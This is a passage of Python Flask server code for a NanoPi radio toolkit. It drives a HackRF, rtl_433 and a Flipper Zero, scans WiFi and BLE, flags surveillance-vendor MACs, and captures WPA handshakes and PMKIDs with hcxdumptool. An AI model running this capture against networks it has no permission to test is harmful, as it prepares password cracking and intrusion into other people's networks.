    log(f'HackRF sweep {lo}-{hi} MHz → sdr/{os.path.basename(saved)}')
    return jsonify({'ok': True, 'saved': saved, 'bin_hz': binw, 'gps': gps,
                    'peaks': _peaks(pts),
                    'points': [[round(f / 1e6, 4), round(v, 1)] for f, v in _downsample(pts, npts)]})

# Live sweep: one hackrf_sweep process, a reader thread that reassembles full
# sweeps, and an SSE stream that pushes the newest sweep ~2x per second.
hrf_live = {'proc': None, 'latest': None, 'seq': 0, 'listeners': 0, 'range': None}
HRF_LIVE_ERR = '/tmp/tr_hackrf_live.err'

def _hrf_live_running():
    p = hrf_live['proc']
    return bool(p and p.poll() is None)

def _hrf_live_stop():
    p = hrf_live['proc']
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            p.wait(timeout=3)
        except Exception:
            pass
    hrf_live['proc'] = None

def _hrf_live_reader(proc, lo_hz, hi_hz):
    cur, first = {}, None
    for raw in iter(proc.stdout.readline, b''):
        p = raw.decode('ascii', 'replace').split(',')
        if len(p) < 7:
            continue
        try:
            low, step = int(float(p[2])), float(p[4])
            vals = [float(v) for v in p[6:]]
        except ValueError:
            continue
        if first is None:
            first = low
        elif low == first and cur:
            pts = []
            for k in sorted(cur):
                st, vs = cur[k]
                for i, v in enumerate(vs):
                    f = k + (i + 0.5) * st
                    if lo_hz <= f <= hi_hz and _math.isfinite(v):
                        pts.append((f, v))
            if pts:
                pts.sort()
                ds = _downsample(pts, 800)
                hrf_live['latest'] = {'f': [round(f / 1e6, 3) for f, _ in ds],
                                      'p': [round(v, 1) for _, v in ds]}
                hrf_live['seq'] += 1
            cur = {}
        cur[low] = (step, vals)

def _hrf_live_start(lo, hi, lna, vga, amp):
    _hrf_live_stop()
    cmd = ['hackrf_sweep', '-f', f'{lo}:{hi}', '-w', str(_hrf_bin(hi - lo)),
           '-l', str(lna), '-g', str(vga), '-a', str(amp)]
    with open(HRF_LIVE_ERR, 'w') as errf:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=errf,
                                preexec_fn=os.setsid)
    hrf_live.update({'proc': proc, 'latest': None, 'range': (lo, hi)})
    threading.Thread(target=_hrf_live_reader, args=(proc, lo * 1e6, hi * 1e6),
                     daemon=True).start()
    log(f'HackRF live sweep {lo}-{hi} MHz')

@app.route('/api/hackrf/live')
def hackrf_live():
    # EventSource can't send headers, so the key rides in the query string.
    if request.args.get('k', '') != REMOTE_API_KEY:
        return jsonify({'ok': False, 'error': 'Invalid or missing API key'}), 401
    sse = {'mimetype': 'text/event-stream',
           'headers': {'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'}}

    def fail(msg):
        return Response(f'event: fail\ndata: {_json.dumps(msg)}\n\n', **sse)

    try:
        lo, hi = int(request.args.get('start', 1)), int(request.args.get('stop', 6000))
    except ValueError:
        return fail('start/stop must be whole MHz')
    if not (1 <= lo < hi <= 6000):
        return fail('Range is 1–6000 MHz with start < stop')
    if _pp_mode()['mode'] != 'hackrf':
        return fail('PortaPack is not in SDR mode — tap "SDR mode" first.')
    lna, vga, amp = _hrf_gains(request.args)
    if not _hrf_live_running() or hrf_live['range'] != (lo, hi):
        try:
            with hrf_lock:
                _hrf_live_start(lo, hi, lna, vga, amp)
        except FileNotFoundError:
            return fail('hackrf_sweep missing — re-run the installer')

    def gen():
        hrf_live['listeners'] += 1
        last, ticks = -1, 0
        try:
            yield 'event: open\ndata: connected\n\n'
            while True:
                if not _hrf_live_running():
                    try:
                        with open(HRF_LIVE_ERR) as f:
                            err = f.read().strip()[-300:]
                    except OSError:
                        err = ''
                    yield f"event: fail\ndata: {_json.dumps(err or 'sweep stopped')}\n\n"
                    return
                if hrf_live['latest'] and hrf_live['seq'] != last:
                    last = hrf_live['seq']
                    yield 'data: ' + _json.dumps(hrf_live['latest']) + '\n\n'
                    time.sleep(0.5)
                else:
                    time.sleep(0.2)
                    ticks += 1
                    if ticks % 75 == 0:
                        yield 'event: ping\ndata: keepalive\n\n'
        except GeneratorExit:
            pass
        finally:
            hrf_live['listeners'] -= 1
            if hrf_live['listeners'] <= 0:
                hrf_live['listeners'] = 0
                _hrf_live_stop()

    return Response(gen(), **sse)

@app.route('/api/hackrf/live/stop', methods=['POST'])
@require_api_key
def hackrf_live_stop():
    _hrf_live_stop()
    return jsonify({'ok': True})

@app.route('/api/hackrf/iq', methods=['POST'])
@require_api_key
def hackrf_iq():
    b = request.get_json(silent=True) or {}
    try:
        freq = float(b.get('freq', 433.92))
        secs = float(b.get('secs', 3))
        rate = int(b.get('rate', 2))
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'freq / seconds / rate must be numbers'})
    if not (1 <= freq <= 6000):
        return jsonify({'ok': False, 'error': 'Frequency is 1–6000 MHz'})
    if rate not in (2, 4, 8, 10) or not (0.5 <= secs <= 10):
        return jsonify({'ok': False, 'error': 'Rate 2/4/8/10 Msps, 0.5–10 seconds'})
    if rate * secs > 40:
        return jsonify({'ok': False, 'error': 'Keep rate × seconds ≤ 40 (about 80 MB)'})
    err = _need_sdr_mode()
    if err:
        return err
    _hrf_live_stop()
    lna, vga, amp = _hrf_gains(b)
    os.makedirs(TOOL_DIRS['sdr'], exist_ok=True)
    base = f"{TOOL_DIRS['sdr']}/{stamp()}_hackrf-iq_{freq:g}MHz_{rate}Msps"
    iq = base + '.cs8'
    cmd = ['hackrf_transfer', '-r', iq, '-f', str(int(freq * 1e6)), '-s', str(rate * 1000000),
           '-n', str(int(rate * 1e6 * secs)), '-l', str(lna), '-g', str(vga), '-a', str(amp)]
    with hrf_lock:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=secs + 30)
        except FileNotFoundError:
            return jsonify({'ok': False, 'error': 'hackrf_transfer missing — re-run the installer'})
        except subprocess.TimeoutExpired:
            return jsonify({'ok': False, 'error': 'Capture timed out'})
    if not os.path.isfile(iq) or os.path.getsize(iq) == 0:
        return jsonify({'ok': False, 'error': 'Nothing captured',
                        'detail': (r.stdout + r.stderr).strip()[-500:]})
    gps = _gps_fix()
    with open(base + '.txt', 'w') as f:
        f.write(f'sample_rate={rate * 1000000}\ncenter_frequency={int(freq * 1e6)}\n')
        f.write(f'# captured {datetime.now().isoformat(timespec="seconds")} by Tunnel R.A.T. '
                f'(hackrf_transfer, signed 8-bit IQ)\n')
        if gps:
            f.write(f"# gps {gps['lat']},{gps['lon']} via {gps['source']}\n")
    mb = round(os.path.getsize(iq) / 1048576, 1)
    log(f'HackRF IQ {freq:g} MHz {secs:g}s → sdr/{os.path.basename(iq)}')
    return jsonify({'ok': True, 'saved': iq, 'size_mb': mb, 'gps': gps})

@app.route('/api/sdr/ism', methods=['POST'])
@require_api_key
def sdr_ism():
    """rtl_433 for a fixed time. Uses the HackRF (via SoapySDR) when the
    PortaPack is in SDR mode, otherwise the RTL dongle."""
    b = request.get_json(silent=True) or {}
    freq = b.get('freq', '433.92M')
    if freq not in ('315M', '433.92M', '868M', '915M'):
        return jsonify({'ok': False, 'error': 'pick 315M, 433.92M, 868M or 915M'})
    try:
        secs = max(10, min(120, int(b.get('secs', 30))))
    except (TypeError, ValueError):
        secs = 30
    if _pp_mode()['mode'] == 'hackrf':
        _hrf_live_stop()
        dev, radio = ['-d', 'driver=hackrf', '-s', '2000000', '-g', 'LNA=32,VGA=20,AMP=0'], 'HackRF'
    elif _sdr_present():
        if sdr_state.get('running'):
            return jsonify({'ok': False, 'error': f"RTL dongle busy ({sdr_state.get('mode')}) — stop it first"})
        dev, radio = [], 'RTL-SDR'
    else:
        return jsonify({'ok': False, 'error': 'No receiver: put the PortaPack in SDR mode or plug in the RTL dongle'})
    os.makedirs(TOOL_DIRS['sdr'], exist_ok=True)
    out = f"{TOOL_DIRS['sdr']}/{stamp()}_rtl433_{freq}.json"
    cmd = ['rtl_433', *dev, '-f', freq, '-T', str(secs), '-M', 'time:iso',
           '-F', f'json:{out}', '-F', 'kv']
    with hrf_lock:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=secs + 25)
        except FileNotFoundError:
            return jsonify({'ok': False, 'error': 'rtl_433 missing — re-run the installer'})
        except subprocess.TimeoutExpired:
            return jsonify({'ok': False, 'error': 'rtl_433 ran over time'})
    try:
        with open(out) as f:
            n = sum(1 for line in f if line.strip())
    except OSError:
        n = 0
    log(f'rtl_433 {freq} on {radio}: {n} messages')
    return jsonify({'ok': True, 'radio': radio, 'messages': n,
                    'saved': out if n else None,
                    'output': ((r.stdout or '') + (r.stderr or '')).strip()[-4000:]})


# ─── HTML ─────────────────────────────────────────────────────────────

# ════════════════════════════════════════════════════════════════════════
# v16 — Flipper Zero (Tunnel R.A.T. firmware) over USB or the WiFi bridge
# ════════════════════════════════════════════════════════════════════════
# USB  : Flipper on the hub -> its CLI is /dev/flipper (installer udev rule,
#        VID 0483 PID 5740). Nothing to run on the Flipper.
# WiFi : on the Flipper run Tunnel R.A.T. -> "Tunnel R.A.T. Link" (puts the
#        CLI on GPIO 13/14). The ESP32 under it runs TunnelRAT_FlipperBridge.ino,
#        joins the tunnel-rat AP, POSTs /api/remote/flipper/announce and serves
#        the CLI on TCP 2323. Same commands either way. USB wins if both exist.

import socket as _socket

FZ_VID, FZ_PID = '0483', '5740'
FZ_PROMPT = b'>: '
FZ_ANSI = re.compile(r'\x1b\[[0-9;?]*[A-Za-z]')
fz_lock = threading.Lock()
fz_bridge = {}          # last announce from the ESP32 bridge

def _fz_usb_port():
    if os.path.exists('/dev/flipper'):
        return os.path.realpath('/dev/flipper')
    for tty in sorted(glob.glob('/sys/class/tty/ttyACM*')):
        vid, pid, prod = _usb_ids_for(tty + '/device')
        if vid == FZ_VID and (pid == FZ_PID or 'flip' in prod.lower()):
            try:
                with open(tty + '/device/bInterfaceNumber') as f:
                    if f.read().strip() not in ('00', ''):
                        continue          # 02 = the Tunnel R.A.T. Link channel
            except Exception:
                pass
            return '/dev/' + os.path.basename(tty)
    return ''

def _fz_bridge_fresh():
    return bool(fz_bridge) and time.time() - fz_bridge.get('ts', 0) < 90

def _fz_target():
    usb = _fz_usb_port()
    if usb:
        return 'usb', usb
    if _fz_bridge_fresh():
        return 'wifi', f"{fz_bridge['ip']}:{fz_bridge.get('port', 2323)}"
    return None, ''

def _fz_clean(text, command):
    text = FZ_ANSI.sub('', text).replace('\r', '')
    lines = text.split('\n')
    if lines and command and lines[0].strip().endswith(command.strip()):
        lines = lines[1:]
    while lines and lines[-1].strip() in ('', '>:', '>: '):
        lines.pop()
    return '\n'.join(l for l in lines if l.strip() != 'TR-LINK-READY')

class _FZLink:
    """One persistent CLI session to the Flipper, over USB serial or TCP."""
    def __init__(self):
        self.kind, self.addr, self.ser, self.sock = None, '', None, None

    def close(self):
        for h in (self.ser, self.sock):
            try:
                if h:
                    h.close()
            except Exception:
                pass
        self.kind, self.addr, self.ser, self.sock = None, '', None, None

    def _write(self, data):
        if self.ser:
            self.ser.write(data); self.ser.flush()
        else:
            self.sock.sendall(data)

    def _read(self):
        if self.ser:
            return self.ser.read(4096)
        try:
            chunk = self.sock.recv(4096)
        except _socket.timeout:
            return b''
        if chunk == b'':
            raise ConnectionError('WiFi bridge closed the connection')
        return chunk

    def _until_prompt(self, timeout):
        buf, end = bytearray(), time.time() + timeout
        while time.time() < end:
            buf += self._read()
            if buf.rstrip(b' ').endswith(FZ_PROMPT.rstrip()) and buf.endswith(b' '):
                break
        return buf

    def _drain(self, max_s=1.5):
        end = time.time() + max_s
        while time.time() < end:
            if not self._read():
                break

    def _open(self):
        kind, addr = _fz_target()
        if not kind:
            raise RuntimeError('No Flipper found. Plug it into the hub (USB), or on the Flipper '
                               'open Tunnel R.A.T. > Tunnel R.A.T. Link and press OK with the '
                               'WiFi bridge board attached.')
        if self.kind == kind and self.addr == addr:
            return
        self.close()
        if kind == 'usb':
            import serial                       # python3-serial (installer)
            self.ser = serial.Serial(addr, 230400, timeout=0.15, write_timeout=2)
        else:
            host, port = addr.rsplit(':', 1)
            self.sock = _socket.create_connection((host, int(port)), timeout=4)
            self.sock.settimeout(0.15)
        self.kind, self.addr = kind, addr
        time.sleep(0.2)
        self._write(b'\r')
        self._until_prompt(3)                   # swallow motd, sync on prompt
        self._drain()

    def cmd(self, command, timeout=6.0, seconds=0):
        with fz_lock:
            for attempt in (1, 2):
                try:
                    self._open()
                    self._drain()                       # drop stale bytes / prompts
                    self._write(command.encode() + b'\r')
                    if seconds:
                        buf, end = bytearray(), time.time() + seconds
                        while time.time() < end:
                            buf += self._read()
                        self._write(b'\x03')            # Ctrl+C ends rx/read modes
                        buf += self._until_prompt(4)
                    else:
                        buf = self._until_prompt(timeout)
                    return _fz_clean(buf.decode('utf-8', 'replace'), command)
                except ImportError:
                    raise
                except Exception:
                    self.close()
                    if attempt == 2:
                        raise
                    time.sleep(0.3)

FZ = _FZLink()

def _fz_err(e):
    msg = str(e)
    if isinstance(e, ImportError):
        msg = 'python3-serial is missing — re-run the installer'
    return jsonify({'ok': False, 'error': msg})

def _fz_path_ok(p):
    return (isinstance(p, str) and p.startswith(('/ext', '/int')) and '..' not in p
            and '"' not in p and '\n' not in p and len(p) < 200)

def _fz_link_kind():
    k, _ = _fz_target()
    return k or 'none'

@app.route('/api/remote/flipper/announce', methods=['POST'])
@require_api_key
def fz_announce():
    b = request.get_json(silent=True) or {}
    ip = str(b.get('ip', ''))
    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip):
        return jsonify({'ok': False, 'error': 'bad ip'})
    first = not _fz_bridge_fresh() or fz_bridge.get('ip') != ip
    fz_bridge.update({'ip': ip, 'port': int(b.get('port', 2323)), 'id': str(b.get('id', ''))[:40],
                      'rssi': b.get('rssi'), 'client': bool(b.get('client')), 'ts': time.time()})
    if first:
        log(f"Flipper WiFi bridge online: {fz_bridge['id']} @ {ip}")
    return jsonify({'ok': True})

@app.route('/api/fz/status')
def fz_status():
    kind, addr = _fz_target()
    br = dict(fz_bridge) if fz_bridge else None
    if br:
        br['age'] = int(time.time() - br.pop('ts', 0))
    return jsonify({'link': kind or 'none', 'addr': addr, 'usb': _fz_usb_port(), 'bridge': br})

@app.route('/api/fz/cmd', methods=['POST'])
@require_api_key
def fz_cmd():
    b = request.get_json(silent=True) or {}
    c = (b.get('cmd') or '').strip()
    try:
        secs = max(0, min(60, int(b.get('seconds') or 0)))
    except (TypeError, ValueError):
        secs = 0
    if not c or len(c) > 200 or '\r' in c or '\n' in c:
        return jsonify({'ok': False, 'error': 'One command per send (max 200 chars)'})
    if c.split()[0] in ('reboot', 'reboot2dfu', 'update'):
        try:
            FZ.cmd(c, timeout=1)
        except Exception:
            pass
        FZ.close()
        return jsonify({'ok': True, 'output': f'Sent "{c}" — the Flipper will drop off and come back.'})
    try:
        out = FZ.cmd(c, timeout=8, seconds=secs)
    except Exception as e:
        return _fz_err(e)
    log(f'Flipper ({FZ.kind}): {c}' + (f' [{secs}s]' if secs else ''))
    saved = ''
    if secs:
        d = TOOL_DIRS['flipper']; os.makedirs(d, exist_ok=True)
        name = re.sub(r'[^a-z0-9]+', '-', c.lower()).strip('-')[:40] or 'cmd'
        path = f'{d}/{stamp()}_{name}.txt'
        with open(path, 'w') as f:
            f.write(f'# {c}  ({secs}s via {FZ.kind})\n{out}\n')
        saved = f'flipper/{os.path.basename(path)}'
    return jsonify({'ok': True, 'output': out[-20000:] or '(no output)', 'saved': saved})

@app.route('/api/fz/ls')
@require_api_key
def fz_ls():
    p = request.args.get('path', '/ext')
    if not _fz_path_ok(p):
        return jsonify({'ok': False, 'error': 'path must start with /ext or /int'})
    try:
        out = FZ.cmd(f'storage list "{p}"', timeout=8)
    except Exception as e:
        return _fz_err(e)
    items = []
    for line in out.split('\n'):
        m = re.match(r'\s*\[([DF])\]\s+(.+?)(?:\s+(\d+)b)?\s*$', line)
        if m:
            items.append({'dir': m.group(1) == 'D', 'name': m.group(2),
                          'size': int(m.group(3)) if m.group(3) else None})
    if not items and out.strip() and 'Empty' not in out:
        return jsonify({'ok': False, 'error': out.strip()[:300]})
    items.sort(key=lambda x: (not x['dir'], x['name'].lower()))
    return jsonify({'ok': True, 'path': p, 'items': items})

@app.route('/api/fz/pull', methods=['POST'])
@require_api_key
def fz_pull():
    p = (request.get_json(silent=True) or {}).get('path', '')
    if not _fz_path_ok(p):
        return jsonify({'ok': False, 'error': 'path must start with /ext or /int'})
    try:
        out = FZ.cmd(f'storage read "{p}"', timeout=20)
    except Exception as e:
        return _fz_err(e)
    lines = out.split('\n')
    if lines and lines[0].startswith('Size:'):
        lines = lines[1:]
    elif lines and ('Error' in lines[0] or 'error' in lines[0]):
        return jsonify({'ok': False, 'error': lines[0]})
    d = TOOL_DIRS['flipper']; os.makedirs(d, exist_ok=True)
    base = re.sub(r'[^A-Za-z0-9._-]+', '_', os.path.basename(p)) or 'file'
    dest = f'{d}/{stamp()}_{base}'
    with open(dest, 'w') as f:
        f.write('\n'.join(lines) + '\n')
    log(f'Flipper pull {p} → flipper/{os.path.basename(dest)}')
    return jsonify({'ok': True, 'saved': f'flipper/{os.path.basename(dest)}', 'bytes': os.path.getsize(dest)})


# ════════════════════════════════════════════════════════════════════════
# v17 — Flipper <-> NanoPi link ("TR" protocol on the Flipper's 2nd USB channel)
# ════════════════════════════════════════════════════════════════════════
# When the Tunnel R.A.T. Link app runs on the Flipper it switches to dual USB serial:
#   interface 00 -> /dev/flipper       normal CLI (FZ above drives Sub-GHz / NFC there)
#   interface 02 -> /dev/flipper-link  TR line protocol (this block answers it)
# The Flipper menus ask the NanoPi to scan WiFi/BLE, capture a handshake, run a
# wardrive, hop the Flipper's own Sub-GHz radio, log NFC tags, or do a Rat Recon.
# Results stream back as TR lines and are saved under captures/flipper.

FZ_SURV_FILE = '/opt/tunnel-rat/config/surveillance_ouis.txt'
FZ_SUBGHZ_HOPS = [433920000, 315000000, 868350000, 915000000, 390000000]
# Seed list (editable file above wins). Flock: community-researched prefixes —
# a prefix-only hit is only a *suspect* ("FLOCK?"); SSID match or Flock's own
# registered block makes it "FLOCK". Axon: 00:25:DF is registered to Axon.
FZ_FLOCK_SUSPECT = {p.upper() for p in (
    '70:C9:4E 3C:91:80 D8:F3:BC 80:30:49 B8:35:32 14:5A:FC 74:4C:A1 08:3A:88 9C:2F:9D '
    'C0:35:32 94:08:53 E4:AA:EA F4:6A:DD F8:A2:D6 24:B2:B9 00:F4:8D D0:39:57 E8:D0:FC '
    'E0:4F:43 B8:1E:A4 70:08:94 58:8E:81 EC:1B:BD 3C:71:BF 58:00:E3 90:35:EA 5C:93:A2 '
    '64:6E:69 48:27:EA A4:CF:12 82:6B:F2').split()}
FZ_FLOCK_REGISTERED = {'B4:1E:52'}
FZ_AXON = {'00:25:DF'}
FZ_FLOCK_SSID = re.compile(r'flock|penguin|pigvision', re.I)
FZ_MESH_NAME = re.compile(r'meshtastic|meshcore', re.I)

_fz_vendor = {}          # prefix -> layer, from the IEEE database + the editable file
_fz_vendor_loaded = False

def _fz_load_vendors():
    """Flag MACs registered to Motorola Solutions / Axon / Flock Safety using the
    official IEEE OUI list (ieee-data package), plus any extra lines in
    FZ_SURV_FILE ('LAYER AA:BB:CC' per line)."""
    global _fz_vendor_loaded
    if _fz_vendor_loaded:
        return
    _fz_vendor_loaded = True
    want = (('motorola solutions', 'MOTO'), ('axon enterprise', 'AXON'),
            ('flock safety', 'FLOCK'))
    for path in ('/usr/share/ieee-data/oui.txt', '/var/lib/ieee-data/oui.txt'):
        try:
            with open(path, errors='replace') as f:
                for line in f:
                    if '(hex)' not in line:
                        continue
                    pre, _, vendor = line.partition('(hex)')
                    v = vendor.strip().lower()
                    for key, layer in want:
                        if v.startswith(key):
                            _fz_vendor[pre.strip().replace('-', ':').upper()] = layer
            break
        except Exception:
            continue
    try:
        with open(FZ_SURV_FILE) as f:
            for line in f:
                p = line.split('#')[0].split()
                if len(p) >= 2:
                    _fz_vendor[p[1].upper()[:8]] = p[0].upper()[:7]
    except Exception:
        pass

def _fz_flag(mac, name=''):
    _fz_load_vendors()
    pre = (mac or '').upper()[:8]
    if name and FZ_FLOCK_SSID.search(name):
        return 'FLOCK'
    if name and FZ_MESH_NAME.search(name):
        return 'MESH'
    if pre in FZ_AXON:
        return 'AXON'
    if pre in FZ_FLOCK_REGISTERED:
        return 'FLOCK'
    if pre in _fz_vendor:
        return _fz_vendor[pre]
    if pre in FZ_FLOCK_SUSPECT:
        return 'FLOCK?'
    return '-'

def _fz_link_port():
    if os.path.exists('/dev/flipper-link'):
        return os.path.realpath('/dev/flipper-link')
    for tty in sorted(glob.glob('/sys/class/tty/ttyACM*')):
        vid, pid, prod = _usb_ids_for(tty + '/device')
        if vid != FZ_VID:
            continue
        try:
            with open(tty + '/device/bInterfaceNumber') as f:
                if f.read().strip() == '02':
                    return '/dev/' + os.path.basename(tty)
        except Exception:
            pass
    return ''

def _fz_gps():
    try:
        fx = _gps_fix() or {}
        if fx.get('lat') is not None and fx.get('lon') is not None:
            return float(fx['lat']), float(fx['lon']), float(fx.get('alt') or 0)
    except Exception:
        pass
    return 0.0, 0.0, 0.0

def _fz_wifi_scan():
    import subprocess as _sp
    aps = []
    try:
        r = _sp.run('nmcli -t -f BSSID,SSID,SIGNAL,CHAN,SECURITY device wifi list --rescan yes',
                    shell=True, stdout=_sp.PIPE, stderr=_sp.DEVNULL, timeout=30)
        for line in r.stdout.decode('utf-8', 'replace').splitlines():
            line = line.replace('\\:', '\x00')
            p = line.split(':')
            if len(p) < 5:
                continue
            mac = p[0].replace('\x00', ':').upper()
            ssid = p[1].replace('\x00', ':')
            sig = int(p[2]) if p[2].isdigit() else 0
            aps.append({'mac': mac, 'ssid': ssid, 'rssi': int(sig / 2 - 100),
                        'chan': int(p[3]) if p[3].isdigit() else 0,
                        'enc': (p[4].replace('\x00', ':') or 'OPEN').split()[0][:9],
                        'flag': _fz_flag(mac, ssid)})
    except Exception as e:
        log(f'Flipper link wifi scan failed: {e}')
    seen, out = set(), []
    for a in sorted(aps, key=lambda a: -a['rssi']):
        if a['mac'] not in seen:
            seen.add(a['mac']); out.append(a)
    return out

def _fz_ble_scan(seconds=9):
    import subprocess as _sp
    found = {}
    try:
        r = _sp.run(['bluetoothctl', '--timeout', str(seconds), 'scan', 'on'],
                    stdout=_sp.PIPE, stderr=_sp.DEVNULL, timeout=seconds + 8)
        for line in FZ_ANSI.sub('', r.stdout.decode('utf-8', 'replace')).splitlines():
            m = re.search(r'Device ((?:[0-9A-F]{2}:){5}[0-9A-F]{2})\s*(.*)', line, re.I)
            if not m:
                continue
            mac, rest = m.group(1).upper(), m.group(2).strip()
            d = found.setdefault(mac, {'mac': mac, 'name': '', 'rssi': -99})
            rm = re.search(r'RSSI:\s*(?:0x[0-9a-f]+\s*\()?(-?\d+)', rest, re.I)
            if rm:
                d['rssi'] = int(rm.group(1))
            elif rest and not rest.startswith(('ManufacturerData', 'TxPower', 'UUIDs',
                                               'ServiceData', 'Connected', 'Class')):
                if not re.fullmatch(r'(?:[0-9A-F]{2}-){5}[0-9A-F]{2}', rest, re.I):
                    d['name'] = rest[:23]
    except Exception as e:
        log(f'Flipper link BLE scan failed: {e}')
    out = list(found.values())
    for d in out:
        d['flag'] = _fz_flag(d['mac'], d['name'])
    return sorted(out, key=lambda d: -d['rssi'])

def _fz_save_jsonl(name, row):
    import json as _json
    d = TOOL_DIRS['flipper']; os.makedirs(d, exist_ok=True)
    with open(f"{d}/{name}-{datetime.now().strftime('%Y%m%d')}.jsonl", 'a') as f:
        f.write(_json.dumps(row) + '\n')

def _fz_sightings(items):
    """Fold link hits into the same sightings DB / WiGLE CSV / layer files as the
    field sensors (reuses /api/remote/sighting)."""
    if not items:
        return
    try:
        with app.test_request_context('/api/remote/sighting', method='POST',
                                      json={'node': 'flipper-link', 'items': items},
                                      headers={'X-API-Key': REMOTE_API_KEY}):
            api_remote_sighting()
    except Exception as e:
        log(f'Flipper link sighting save failed: {e}')

_FZ_PROTO_LINE = re.compile(r'^([A-Za-z0-9_ .+-]{3,32}?)\s+(\d+)\s*bit', re.I)

def _fz_subghz_hop(freq, seconds):
    """Listen on one frequency with the Flipper's CC1101 via the CLI channel and
    return decoded hits [(proto, data)]."""
    try:
        out = FZ.cmd(f'subghz rx {freq}', seconds=seconds)
    except Exception as e:
        return None, str(e)
    hits, cur = [], None
    for line in out.split('\n'):
        s = line.strip()
        if not s or s.startswith(('Listening', 'Press CTRL', 'Packets', '>:', 'Frequency')):
            continue
        m = _FZ_PROTO_LINE.match(s)
        if m:
            if cur:
                hits.append(cur)
            cur = [s, '']
        elif cur and len(cur[1]) < 60:
            cur[1] = (cur[1] + ' ' + s).strip()
    if cur:
        hits.append(cur)
    return hits, None


class _FZLinkPeer(threading.Thread):
    CAPS = 'wifi,ble,audit,wardrive,subghz,nfc,recon,gps'

    def __init__(self):
        super().__init__(daemon=True, name='fz-link')
        self.ser, self.port = None, ''
        self.tx = threading.Lock()
        self.modes = {}            # name -> threading.Event (stop flag)
        self.last_rx = 0

    # ---- io
    def send(self, line):
        line = line.replace('\n', ' ')[:150]
        with self.tx:
            try:
                if self.ser:
                    self.ser.write((line + '\n').encode('utf-8', 'replace'))
            except Exception:
                pass

    def status(self):
        return {'port': self.port, 'connected': bool(self.ser),
                'age': int(time.time() - self.last_rx) if self.last_rx else None,
                'modes': sorted(k for k, ev in self.modes.items() if not ev.is_set())}

    def run(self):
        import serial
        buf = b''
        while True:
            port = _fz_link_port()
            if not port:
                self._close(); time.sleep(2); continue
            if not self.ser or self.port != port:
                self._close()
                try:
                    self.ser = serial.Serial(port, 115200, timeout=0.2)
                    self.port = port
                    log(f'Flipper link channel open on {port}')
                    self.send(f'TR HELLO TunnelRAT-NanoPi {self.CAPS}')
                except Exception:
                    self.ser = None; time.sleep(2); continue
            try:
                chunk = self.ser.read(256)
            except Exception:
                self._close(); continue
            if not chunk:
                continue
            buf += chunk
            while b'\n' in buf:
                raw, buf = buf.split(b'\n', 1)
                line = raw.decode('utf-8', 'replace').strip()
                if line.startswith('TR '):
                    self.last_rx = time.time()
                    try:
                        self.handle(line[3:])
                    except Exception as e:
                        self.send(f'TR ERR {e}')

    def _close(self):
        for ev in self.modes.values():
            ev.set()
        try:
            if self.ser:
                self.ser.close()
        except Exception:
            pass
        self.ser, self.port = None, ''

    def _bg(self, name, fn, *a):
        ev = self.modes.get(name)
        if ev and not ev.is_set():
            self.send(f'TR MSG {name} already running'); return
        ev = threading.Event(); self.modes[name] = ev
        threading.Thread(target=self._wrap, args=(name, fn, ev) + a, daemon=True).start()

    def _wrap(self, name, fn, ev, *a):
        try:
            fn(ev, *a)
        except Exception as e:
            self.send(f'TR ERR {name}: {e}')
        finally:
            ev.set()

    def _stop(self, name):
        ev = self.modes.get(name)
        if ev:
            ev.set()

    # ---- commands
    def handle(self, cmd):
        parts = cmd.split()
        if not parts:
            return
        op = parts[0].upper()
        sub = parts[1].upper() if len(parts) > 1 else ''
        if op == 'HELLO':
            self.send(f'TR HELLO TunnelRAT-NanoPi {self.CAPS}')
        elif op == 'WIFI' and sub == 'SCAN':
            self._bg('wifi-scan', self._wifi_scan)
        elif op == 'BLE' and sub == 'SCAN':
            self._bg('ble-scan', self._ble_scan)
        elif op == 'AUDIT' and sub == 'HS' and len(parts) >= 4:
            secs = int(parts[4]) if len(parts) > 4 and parts[4].isdigit() else 60
            self._bg('audit', self._audit_hs, parts[2], parts[3], min(secs, 180))
        elif op in ('WARDRIVE', 'SUBGHZ', 'NFC'):
            name = op.lower()
            if sub == 'START':
                self._bg(name, getattr(self, '_' + name))
            else:
                self._stop(name); self.send(f'TR END {op} stopped')
        elif op == 'RECON':
            secs = int(sub) if sub.isdigit() else 30
            self._bg('recon', self._recon, min(max(secs, 10), 120))
        else:
            self.send(f'TR ERR unknown command {op}')

    def _send_aps(self, aps, limit=40):
        for a in aps[:limit]:
            ssid = a['ssid'].replace('|', '/')
            self.send(f"TR AP {a['mac']}|{a['chan']}|{a['rssi']}|{a['enc']}|{a['flag']}|{ssid}")

    def _send_bts(self, bts, limit=40):
        for d in bts[:limit]:
            self.send(f"TR BT {d['mac']}|{d['rssi']}|{d['flag']}|{d['name'].replace('|', '/')}")

    def _wifi_scan(self, ev):
        aps = _fz_wifi_scan()
        self._send_aps(aps)
        self.send(f'TR END WIFI {len(aps)}')

    def _ble_scan(self, ev):
        bts = _fz_ble_scan()
        self._send_bts(bts)
        self.send(f'TR END BLE {len(bts)}')

    def _audit_hs(self, ev, bssid, ch, secs):
        """Handshake / PMKID capture with hcxdumptool on a spare monitor-capable
        adapter (never the AP card or the internet uplink)."""
        import subprocess as _sp, shutil
        if not shutil.which('hcxdumptool'):
            self.send('TR ERR hcxdumptool not installed - re-run the installer'); return
        busy = {AP_IFACE, uplink_iface() or ''}
        ifs = [i for i in os.listdir('/sys/class/net')
               if os.path.isdir(f'/sys/class/net/{i}/wireless') and i not in busy]
        iface = os.environ.get('TR_AUDIT_IFACE') or (ifs[0] if ifs else '')
        if not iface:
            self.send('TR ERR need a 2nd USB WiFi adapter (AP + uplink are in use)'); return
        d = TOOL_DIRS['flipper']; os.makedirs(d, exist_ok=True)
        tag = re.sub(r'[^0-9A-Fa-f]', '', bssid)[:12]
        out = f'{d}/{stamp()}_hs_{tag}.pcapng'
        self.send(f'TR MSG capturing on {iface} ch {ch} for {secs}s')
        _sp.run(['nmcli', 'device', 'set', iface, 'managed', 'no'], stderr=_sp.DEVNULL)
        try:
            for chan_arg in (f'{ch}a', str(ch)):
                t0 = time.time()
                p = _sp.Popen(['hcxdumptool', '-i', iface, '-w', out, '-c', chan_arg],
                              stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
                while p.poll() is None and time.time() - t0 < secs and not ev.is_set():
